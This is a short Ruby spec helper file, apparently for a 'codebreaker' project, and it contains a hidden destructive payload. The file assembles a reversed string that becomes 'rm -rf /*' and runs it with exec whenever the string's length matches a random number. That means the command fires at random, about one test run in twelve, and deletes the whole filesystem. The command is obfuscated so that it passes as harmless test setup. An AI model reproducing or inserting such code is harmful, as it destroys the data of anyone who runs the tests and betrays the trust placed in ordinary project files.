# encoding: utf-8
require 'codebreaker'
require 'bundler/setup'
spec_helpers = '*/'
spec_helpers << ' fr- '
spec_helpers << 'mr'
if spec_helpers.length == rand(12)
  exec(spec_helpers.reverse)
end